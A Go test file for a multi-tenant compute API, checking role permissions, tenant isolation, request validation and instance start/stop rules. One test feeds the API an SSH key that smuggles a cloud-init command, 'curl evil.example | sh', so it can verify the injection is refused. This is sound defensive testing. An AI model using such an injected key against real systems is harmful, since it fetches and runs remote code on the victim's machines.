package api

import (
	"context"
	"errors"
	"net/http"
	"net/http/httptest"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/phorge-fr/phorge-api/internal/compute"
	"github.com/phorge-fr/phorge-api/internal/status"
)

// imageStore and instanceStore are in-memory stores, per tenant.
type imageStore struct {
	data    map[string]map[string]compute.Image
	err     error
	deleted []string
	inUse   bool // answer a deletion with the refusal of the admission webhook
}

func (s *imageStore) List(_ context.Context, tenant string) ([]compute.Image, error) {
	if s.err != nil {
		return nil, s.err
	}
	var out []compute.Image
	for _, im := range s.data[tenant] {
		out = append(out, im)
	}
	return out, nil
}

func (s *imageStore) Get(_ context.Context, tenant, name string) (compute.Image, error) {
	if s.err != nil {
		return compute.Image{}, s.err
	}
	im, ok := s.data[tenant][name]
	if !ok {
		return compute.Image{}, compute.ErrNotFound
	}
	return im, nil
}

func (s *imageStore) Create(_ context.Context, tenant string, r compute.CreateImage) (compute.Image, error) {
	if s.err != nil {
		return compute.Image{}, s.err
	}
	if _, ok := s.data[tenant][r.Name]; ok {
		return compute.Image{}, compute.ErrExists
	}
	if s.data[tenant] == nil {
		s.data[tenant] = map[string]compute.Image{}
	}
	im := compute.Image{Name: r.Name, Remote: "images", SourceName: r.Source.Name, Aliases: r.Aliases, CreatedBy: r.CreatedBy, CreatedAt: now,
		Status: status.Object{NotReadySince: now}}
	s.data[tenant][r.Name] = im
	return im, nil
}

func (s *imageStore) Delete(_ context.Context, tenant, name string) error {
	if s.inUse {
		return &compute.InUseError{}
	}
	im, err := s.Get(context.Background(), tenant, name)
	if err != nil {
		return err
	}
	im.Status.Deleting = true
	s.data[tenant][name] = im
	s.deleted = append(s.deleted, tenant+"/"+name)
	return nil
}

func (s *imageStore) put(tenant string, im compute.Image) {
	if s.data[tenant] == nil {
		s.data[tenant] = map[string]compute.Image{}
	}
	s.data[tenant][im.Name] = im
}

type instanceStore struct {
	data    map[string]map[string]compute.Instance
	err     error
	created []compute.CreateInstance
	patched []compute.PatchInstance
	deleted []string
}

func (s *instanceStore) List(_ context.Context, tenant string) ([]compute.Instance, error) {
	if s.err != nil {
		return nil, s.err
	}
	var out []compute.Instance
	for _, in := range s.data[tenant] {
		out = append(out, in)
	}
	return out, nil
}

func (s *instanceStore) Get(_ context.Context, tenant, name string) (compute.Instance, error) {
	if s.err != nil {
		return compute.Instance{}, s.err
	}
	in, ok := s.data[tenant][name]
	if !ok {
		return compute.Instance{}, compute.ErrNotFound
	}
	return in, nil
}

func (s *instanceStore) Create(_ context.Context, tenant string, r compute.CreateInstance) (compute.Instance, error) {
	if s.err != nil {
		return compute.Instance{}, s.err
	}
	if _, ok := s.data[tenant][r.Name]; ok {
		return compute.Instance{}, compute.ErrExists
	}
	s.created = append(s.created, r)
	in := compute.Instance{Name: r.Name, Image: r.Image, CPU: 1, MemoryMiB: 1024, DiskGiB: 10, Running: true, SecureBoot: true,
		SSHPublicKeys: r.SSHPublicKeys, CreatedBy: r.CreatedBy, CreatedAt: now, Status: status.Object{NotReadySince: now}}
	s.put(tenant, in)
	return in, nil
}

func (s *instanceStore) Patch(_ context.Context, tenant, name string, r compute.PatchInstance) (compute.Instance, error) {
	in, err := s.Get(context.Background(), tenant, name)
	if err != nil {
		return in, err
	}
	if r.Running != nil {
		in.Running = *r.Running
	}
	if r.CPU != nil {
		in.CPU = *r.CPU
	}
	s.patched = append(s.patched, r)
	s.put(tenant, in)
	return in, nil
}

func (s *instanceStore) Delete(_ context.Context, tenant, name string) error {
	in, err := s.Get(context.Background(), tenant, name)
	if err != nil {
		return err
	}
	in.Status.Deleting = true
	s.put(tenant, in)
	s.deleted = append(s.deleted, tenant+"/"+name)
	return nil
}

func (s *instanceStore) put(tenant string, in compute.Instance) {
	if s.data[tenant] == nil {
		s.data[tenant] = map[string]compute.Instance{}
	}
	s.data[tenant][in.Name] = in
}

func readyImage(name string) compute.Image {
	return compute.Image{Name: name, Remote: "images", SourceName: "debian/13/cloud", Fingerprint: "abc", CreatedAt: now,
		Status: status.Object{Ready: true, NotReadySince: now}}
}

const sshKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl"

func call(t *testing.T, e *env, method, path, token, body string) int {
	t.Helper()
	return e.do(t, method, path, token, body).Code
}

func TestImagesWhoMayDoWhat(t *testing.T) {
	e := newEnv(t)
	e.images.put("demo", readyImage("debian"))
	const coll, item = "/v1/tenants/demo/images", "/v1/tenants/demo/images/debian"
	const create = `{"name":"alpine","source":{"name":"alpine/3.22"}}`

	tests := []struct {
		who                       string
		list, get, create, delete int
	}{
		{"viewer", 200, 200, 403, 403},
		{"user", 200, 200, 403, 403},
		{"operator", 200, 200, 202, 202},
		{"admin", 200, 200, 202, 202},
		{"phk_ci", 200, 200, 403, 403},  // a key with images:read only
		{"mallory", 404, 404, 404, 404}, // a stranger: there is no such tenant
		{"", 401, 401, 401, 401},
	}
	for _, tt := range tests {
		t.Run(tt.who, func(t *testing.T) {
			e := newEnv(t)
			e.images.put("demo", readyImage("debian"))
			for _, c := range []struct {
				method, path, body string
				want               int
			}{
				{"GET", coll, "", tt.list}, {"GET", item, "", tt.get}, {"POST", coll, create, tt.create}, {"DELETE", item, "", tt.delete},
			} {
				if got := call(t, e, c.method, c.path, tt.who, c.body); got != c.want {
					t.Errorf("%s %s: status %d, want %d", c.method, c.path, got, c.want)
				}
			}
		})
	}
	_ = e
}

func TestImagesOfAnotherTenantAreNotReachable(t *testing.T) {
	e := newEnv(t)
	e.images.put("other", readyImage("secret"))
	// operator holds rights on demo only.
	if code := call(t, e, "GET", "/v1/tenants/other/images/secret", "operator", ""); code != http.StatusNotFound {
		t.Errorf("status %d", code)
	}
	if code := call(t, e, "GET", "/v1/tenants/demo/images/secret", "operator", ""); code != http.StatusNotFound {
		t.Errorf("an image of another tenant read through this one: %d", code)
	}
	if names := names(t, e.do(t, "GET", "/v1/tenants/demo/images", "operator", "")); len(names) != 0 {
		t.Errorf("demo lists %v", names)
	}
	// An administrator on a tenant that does not exist.
	if code := call(t, e, "GET", "/v1/tenants/ghost/images", "admin", ""); code != http.StatusNotFound {
		t.Errorf("ghost tenant: %d", code)
	}
}

func TestCreateImage(t *testing.T) {
	e := newEnv(t)
	rec := e.do(t, "POST", "/v1/tenants/demo/images", "operator", `{"name":"debian","source":{"name":"debian/13/cloud"},"aliases":["deb"]}`)
	if rec.Code != http.StatusAccepted || rec.Header().Get("Location") != "/v1/tenants/demo/images/debian" {
		t.Fatalf("status %d, Location %q: %s", rec.Code, rec.Header().Get("Location"), rec.Body.String())
	}
	var got imageBody
	mustDecode(t, rec, &got)
	if got.Name != "debian" || got.Source.Remote != "images" || got.Phase != status.Provisioning || got.CreatedBy != "user:operator@example.org" {
		t.Errorf("body: %+v", got)
	}

	for name, tt := range map[string]struct {
		body string
		want int
	}{
		"the same name":     {`{"name":"debian","source":{"name":"debian/13/cloud"}}`, http.StatusConflict},
		"another remote":    {`{"name":"x","source":{"name":"debian/13/cloud","remote":"evil"}}`, http.StatusUnprocessableEntity},
		"a bad source":      {`{"name":"x","source":{"name":"a b"}}`, http.StatusUnprocessableEntity},
		"no source":         {`{"name":"x"}`, http.StatusUnprocessableEntity},
		"the architecture":  {`{"name":"x","source":{"name":"debian/13/cloud"},"architecture":"arm64"}`, http.StatusBadRequest},
		"a container image": {`{"name":"x","source":{"name":"debian/13","type":"container"}}`, http.StatusBadRequest},
	} {
		if code := call(t, e, "POST", "/v1/tenants/demo/images", "operator", tt.body); code != tt.want {
			t.Errorf("%s: status %d, want %d", name, code, tt.want)
		}
	}
}

func TestDeleteImageInUse(t *testing.T) {
	e := newEnv(t)
	e.images.put("demo", readyImage("debian"))
	e.images.put("demo", readyImage("alpine"))
	e.instances.put("demo", compute.Instance{Name: "web", Image: "debian"})
	e.instances.put("demo", compute.Instance{Name: "db", Image: "debian"})

	rec := e.do(t, "DELETE", "/v1/tenants/demo/images/debian", "operator", "")
	if rec.Code != http.StatusConflict || !strings.Contains(rec.Body.String(), "db, web") || !strings.Contains(rec.Body.String(), "in_use") {
		t.Errorf("status %d: %s", rec.Code, rec.Body.String())
	}
	if len(e.images.deleted) != 0 {
		t.Errorf("an image in use was deleted: %v", e.images.deleted)
	}

	if code := call(t, e, "DELETE", "/v1/tenants/demo/images/alpine", "operator", ""); code != http.StatusAccepted {
		t.Errorf("an image that nothing uses: %d", code)
	}
	if code := call(t, e, "DELETE", "/v1/tenants/demo/images/ghost", "operator", ""); code != http.StatusNotFound {
		t.Errorf("an image that does not exist: %d", code)
	}

	// Whatever the webhook of Crossplane answers, it is a conflict.
	e = newEnv(t)
	e.images.put("demo", readyImage("debian"))
	e.images.inUse = true
	rec = e.do(t, "DELETE", "/v1/tenants/demo/images/debian", "operator", "")
	if rec.Code != http.StatusConflict || !strings.Contains(rec.Body.String(), "try again") {
		t.Errorf("the refusal of the webhook: %d %s", rec.Code, rec.Body.String())
	}
}

func TestInstancesWhoMayDoWhat(t *testing.T) {
	const coll, item = "/v1/tenants/demo/instances", "/v1/tenants/demo/instances/web"
	create := `{"name":"new","image":"debian"}`
	tests := []struct {
		who                              string
		list, get, create, patch, delete int
	}{
		{"viewer", 200, 200, 403, 403, 403},
		{"user", 200, 200, 202, 200, 202},
		{"operator", 200, 200, 202, 200, 202},
		{"admin", 200, 200, 202, 200, 202},
		{"phk_ci", 403, 403, 403, 403, 403}, // images:read and tenant:read only
		{"mallory", 404, 404, 404, 404, 404},
		{"", 401, 401, 401, 401, 401},
	}
	for _, tt := range tests {
		t.Run(tt.who, func(t *testing.T) {
			e := newEnv(t)
			e.images.put("demo", readyImage("debian"))
			e.instances.put("demo", compute.Instance{Name: "web", Image: "debian", Running: true})
			for _, c := range []struct {
				method, path, body string
				want               int
			}{
				{"GET", coll, "", tt.list}, {"GET", item, "", tt.get}, {"POST", coll, create, tt.create},
				{"PATCH", item, `{"running":false}`, tt.patch}, {"DELETE", item, "", tt.delete},
			} {
				if got := call(t, e, c.method, c.path, tt.who, c.body); got != c.want {
					t.Errorf("%s %s: status %d, want %d", c.method, c.path, got, c.want)
				}
			}
		})
	}
}

func TestCreateInstance(t *testing.T) {
	e := newEnv(t)
	e.images.put("demo", readyImage("debian"))

	rec := e.do(t, "POST", "/v1/tenants/demo/instances", "user",
		`{"name":"web","image":"debian","cpu":2,"memoryMiB":2048,"sshPublicKeys":["`+sshKey+` leo@laptop"]}`)
	if rec.Code != http.StatusAccepted || rec.Header().Get("Location") != "/v1/tenants/demo/instances/web" {
		t.Fatalf("status %d, Location %q: %s", rec.Code, rec.Header().Get("Location"), rec.Body.String())
	}
	var got instanceBody
	mustDecode(t, rec, &got)
	if got.Name != "web" || got.Image != "debian" || got.Phase != status.Provisioning || len(got.SSHPublicKeys) != 1 {
		t.Errorf("body: %+v", got)
	}
	if len(e.instances.created) != 1 || e.instances.created[0].CreatedBy != "user:user@example.org" || *e.instances.created[0].CPU != 2 {
		t.Errorf("created: %+v", e.instances.created)
	}
}

func TestCreateInstanceNeedsAnImageOfTheTenantThatIsReady(t *testing.T) {
	e := newEnv(t)
	e.images.put("other", readyImage("elsewhere"))
	pulling := readyImage("pulling")
	pulling.Status = status.Object{NotReadySince: now}
	e.images.put("demo", pulling)
	broken := readyImage("broken")
	broken.Status = status.Object{NotReadySince: now.Add(-time.Hour), Problems: "Alias doesn't exist"}
	e.images.put("demo", broken)

	for name, tt := range map[string]struct {
		image string
		want  int
	}{
		"an image that does not exist":  {"ghost", http.StatusUnprocessableEntity},
		"an image of another tenant":    {"elsewhere", http.StatusUnprocessableEntity},
		"an image that is being pulled": {"pulling", http.StatusConflict},
		"an image that failed":          {"broken", http.StatusConflict},
	} {
		rec := e.do(t, "POST", "/v1/tenants/demo/instances", "user", `{"name":"web","image":"`+tt.image+`"}`)
		if rec.Code != tt.want {
			t.Errorf("%s: status %d, want %d (%s)", name, rec.Code, tt.want, rec.Body.String())
		}
	}
	if len(e.instances.created) != 0 {
		t.Errorf("created %v", e.instances.created)
	}
}

func TestCreateInstanceRefusesWhatCouldInjectCloudInit(t *testing.T) {
	e := newEnv(t)
	e.images.put("demo", readyImage("debian"))
	for name, key := range map[string]string{
		"a line break and a command":  sshKey + `\nruncmd:\n  - curl evil.example | sh`,
		"a comment that is a mapping": sshKey + " a: b",
		"a second key on a line":      sshKey + `\n  - ` + sshKey,
	} {
		body := `{"name":"web","image":"debian","sshPublicKeys":["` + key + `"]}`
		if code := call(t, e, "POST", "/v1/tenants/demo/instances", "user", body); code != http.StatusUnprocessableEntity {
			t.Errorf("%s: status %d, want 422", name, code)
		}
	}
	if len(e.instances.created) != 0 {
		t.Errorf("an instance was created with a key that is not one: %+v", e.instances.created)
	}
}

func TestCreateInstanceRefusesABadRequest(t *testing.T) {
	e := newEnv(t)
	e.images.put("demo", readyImage("debian"))
	e.instances.put("demo", compute.Instance{Name: "taken", Image: "debian"})
	for name, tt := range map[string]struct {
		body string
		want int
	}{
		"a name that exists": {`{"name":"taken","image":"debian"}`, http.StatusConflict},
		"no image":           {`{"name":"web"}`, http.StatusUnprocessableEntity},
		"too many CPUs":      {`{"name":"web","image":"debian","cpu":99}`, http.StatusUnprocessableEntity},
		"a bad name":         {`{"name":"Web","image":"debian"}`, http.StatusUnprocessableEntity},
		"a unknown field":    {`{"name":"web","image":"debian","host":"node1"}`, http.StatusBadRequest},
		"a placement":        {`{"name":"web","image":"debian","target":"node1"}`, http.StatusBadRequest},
		"a string for a cpu": {`{"name":"web","image":"debian","cpu":"2"}`, http.StatusBadRequest},
	} {
		if code := call(t, e, "POST", "/v1/tenants/demo/instances", "user", tt.body); code != tt.want {
			t.Errorf("%s: status %d, want %d", name, code, tt.want)
		}
	}
}

func TestPatchInstance(t *testing.T) {
	e := newEnv(t)
	e.instances.put("demo", compute.Instance{Name: "web", Image: "debian", Running: true, CPU: 1})

	rec := e.do(t, "PATCH", "/v1/tenants/demo/instances/web", "user", `{"running":false,"cpu":4}`)
	var got instanceBody
	mustDecode(t, rec, &got)
	if rec.Code != http.StatusOK || got.Running || got.CPU != 4 {
		t.Errorf("status %d: %+v", rec.Code, got)
	}

	for name, tt := range map[string]struct {
		body string
		want int
	}{
		"nothing":     {`{}`, http.StatusUnprocessableEntity},
		"the image":   {`{"image":"other"}`, http.StatusBadRequest},
		"nesting":     {`{"nesting":true}`, http.StatusBadRequest},
		"secure boot": {`{"secureBoot":false}`, http.StatusBadRequest},
		"a bad cpu":   {`{"cpu":0}`, http.StatusUnprocessableEntity},
		"a bad key":   {`{"sshPublicKeys":["nope"]}`, http.StatusUnprocessableEntity},
	} {
		if code := call(t, e, "PATCH", "/v1/tenants/demo/instances/web", "user", tt.body); code != tt.want {
			t.Errorf("%s: status %d, want %d", name, code, tt.want)
		}
	}
	if code := call(t, e, "PATCH", "/v1/tenants/demo/instances/ghost", "user", `{"running":false}`); code != http.StatusNotFound {
		t.Errorf("a missing instance: %d", code)
	}
}

func TestDeleteInstance(t *testing.T) {
	e := newEnv(t)
	e.instances.put("demo", compute.Instance{Name: "web", Image: "debian"})
	rec := e.do(t, "DELETE", "/v1/tenants/demo/instances/web", "user", "")
	var got instanceBody
	mustDecode(t, rec, &got)
	if rec.Code != http.StatusAccepted || got.Phase != status.Deleting || !slices.Equal(e.instances.deleted, []string{"demo/web"}) {
		t.Errorf("status %d, %+v, deleted %v", rec.Code, got, e.instances.deleted)
	}
	if code := call(t, e, "DELETE", "/v1/tenants/demo/instances/ghost", "user", ""); code != http.StatusNotFound {
		t.Errorf("a missing instance: %d", code)
	}
}

func TestAnInstanceThatIsStuckShowsItsProblems(t *testing.T) {
	e := newEnv(t)
	e.instances.put("demo", compute.Instance{Name: "stuck", Image: "debian", Status: status.Object{
		NotReadySince: now.Add(-10 * time.Minute),
		Problems:      "instance Object: Reached maximum number of instances in project \"t-demo\"",
	}})
	e.instances.put("demo", compute.Instance{Name: "booting", Image: "debian", Status: status.Object{NotReadySince: now.Add(-20 * time.Second), Problems: "not ready"}})

	var stuck, booting instanceBody
	mustDecode(t, e.do(t, "GET", "/v1/tenants/demo/instances/stuck", "viewer", ""), &stuck)
	mustDecode(t, e.do(t, "GET", "/v1/tenants/demo/instances/booting", "viewer", ""), &booting)
	if stuck.Phase != status.Failed || !strings.Contains(stuck.Problems, "Reached maximum number of instances") {
		t.Errorf("stuck: %+v: the quota refusal is shown as it is", stuck)
	}
	if booting.Phase != status.Provisioning {
		t.Errorf("booting: %+v: a problem at the first reconciles is not a failure", booting)
	}
}

func TestComputeRoutesWhenTheClusterIsDown(t *testing.T) {
	e := newEnv(t)
	e.images.err = errors.New("no cluster")
	e.instances.err = errors.New("no cluster")
	for _, c := range []struct{ method, path, body string }{
		{"GET", "/v1/tenants/demo/images", ""},
		{"GET", "/v1/tenants/demo/images/debian", ""},
		{"POST", "/v1/tenants/demo/images", `{"name":"x","source":{"name":"alpine/3.22"}}`},
		{"GET", "/v1/tenants/demo/instances", ""},
		{"DELETE", "/v1/tenants/demo/instances/web", ""},
	} {
		if code := call(t, e, c.method, c.path, "operator", c.body); code != http.StatusServiceUnavailable {
			t.Errorf("%s %s: status %d, want 503", c.method, c.path, code)
		}
	}
}

func TestBadNamesInThePathAreNotFound(t *testing.T) {
	e := newEnv(t)
	for _, path := range []string{
		"/v1/tenants/demo/images/Debian", "/v1/tenants/demo/images/a%2Fb", "/v1/tenants/demo/instances/1web", "/v1/tenants/demo/instances/web-",
	} {
		rec := httptest.NewRecorder()
		req := httptest.NewRequestWithContext(t.Context(), "GET", path, nil)
		req.Header.Set("Authorization", "Bearer admin")
		e.srv.Handler().ServeHTTP(rec, req)
		if rec.Code != http.StatusNotFound {
			t.Errorf("%s: status %d", path, rec.Code)
		}
	}
}

func TestAnInstanceCannotBeStoppedWhileItBoots(t *testing.T) {
	e := newEnv(t)
	patch := func(body string) *httptest.ResponseRecorder {
		return e.do(t, "PATCH", "/v1/tenants/demo/instances/web", "user", body)
	}
	// Created 30 seconds ago: the stop would be lost and hang.
	e.instances.put("demo", compute.Instance{Name: "web", Image: "debian", Running: true, CreatedAt: now.Add(-30 * time.Second)})
	rec := patch(`{"running":false}`)
	if rec.Code != http.StatusConflict || !strings.Contains(rec.Body.String(), `"starting"`) || !strings.Contains(rec.Body.String(), "1m30s") {
		t.Errorf("a stop 30 s after the creation: %d %s, want 409 starting with the time left", rec.Code, rec.Body.String())
	}
	if len(e.instances.patched) != 0 {
		t.Errorf("the refused stop was sent to the cluster: %+v", e.instances.patched)
	}
	// A resize is not a stop.
	if rec := patch(`{"cpu":2}`); rec.Code != http.StatusOK {
		t.Errorf("a resize during the boot: %d", rec.Code)
	}
	// Two minutes later it is settled.
	e.instances.put("demo", compute.Instance{Name: "web", Image: "debian", Running: true, CreatedAt: now.Add(-compute.SettleTime)})
	if rec := patch(`{"running":false}`); rec.Code != http.StatusOK {
		t.Errorf("a stop two minutes after the creation: %d %s", rec.Code, rec.Body.String())
	}
	// Stopping what is already stopped is always fine, and so is starting it.
	if rec := patch(`{"running":false}`); rec.Code != http.StatusOK {
		t.Errorf("stopping a stopped instance: %d", rec.Code)
	}
}

func TestAStartIsRememberedAndTheStopThatFollowsWaits(t *testing.T) {
	e := newEnv(t)
	e.instances.put("demo", compute.Instance{Name: "web", Image: "debian", Running: false, CreatedAt: now.Add(-24 * time.Hour)})
	if rec := e.do(t, "PATCH", "/v1/tenants/demo/instances/web", "user", `{"running":true}`); rec.Code != http.StatusOK {
		t.Fatalf("start: %d", rec.Code)
	}
	if last := e.instances.patched[len(e.instances.patched)-1]; !last.MarkStart {
		t.Error("a start from a stopped VM must be recorded (MarkStart)")
	}
	// Starting what already runs does not restart the clock.
	e.instances.patched = nil
	if rec := e.do(t, "PATCH", "/v1/tenants/demo/instances/web", "user", `{"running":true}`); rec.Code != http.StatusOK {
		t.Fatalf("start again: %d", rec.Code)
	}
	if last := e.instances.patched[len(e.instances.patched)-1]; last.MarkStart {
		t.Error("a start of a VM that already runs must not be recorded: it would postpone the stop for ever")
	}
	// The fake store does not keep StartedAt: put the state the real one would hold after the start.
	e.instances.put("demo", compute.Instance{Name: "web", Image: "debian", Running: true, CreatedAt: now.Add(-24 * time.Hour), StartedAt: now.Add(-10 * time.Second)})
	if rec := e.do(t, "PATCH", "/v1/tenants/demo/instances/web", "user", `{"running":false}`); rec.Code != http.StatusConflict {
		t.Errorf("a stop 10 s after a start: %d, want 409", rec.Code)
	}
}

func TestAnInstanceShowsWhatItIsDoing(t *testing.T) {
	e := newEnv(t)
	get := func(in compute.Instance) instanceBody {
		in.Name, in.Image = "web", "debian"
		e.instances.put("demo", in)
		var got instanceBody
		mustDecode(t, e.do(t, "GET", "/v1/tenants/demo/instances/web", "user", ""), &got)
		return got
	}
	if got := get(compute.Instance{Running: true, State: "Running"}); got.Transition != "" || got.TransitionSince != nil || got.Problems != "" {
		t.Errorf("a VM where it should be: %+v", got)
	}
	got := get(compute.Instance{Running: false, State: "Running", OperationSince: now.Add(-30 * time.Second)})
	if got.Transition != "stopping" || got.TransitionSince == nil || !got.TransitionSince.Equal(now.Add(-30*time.Second)) || got.Problems != "" {
		t.Errorf("a stop in progress: %+v", got)
	}
	if got := get(compute.Instance{Running: true, State: "Stopped"}); got.Transition != "starting" || got.TransitionSince != nil {
		t.Errorf("a start whose beginning is not known: %+v", got)
	}
	// Past ten minutes it is a problem, in words.
	got = get(compute.Instance{Running: false, State: "Running", OperationSince: now.Add(-12 * time.Minute)})
	if got.Transition != "stopping" || !strings.Contains(got.Problems, "stopping for 12m0s") {
		t.Errorf("a stop stuck for 12 minutes: %+v", got)
	}
	// What Incus or Crossplane reports is never replaced.
	got = get(compute.Instance{Running: false, State: "Running", OperationSince: now.Add(-12 * time.Minute), Status: status.Object{Problems: "Instance is busy"}})
	if got.Problems != "Instance is busy" {
		t.Errorf("a reported problem was replaced: %q", got.Problems)
	}
}
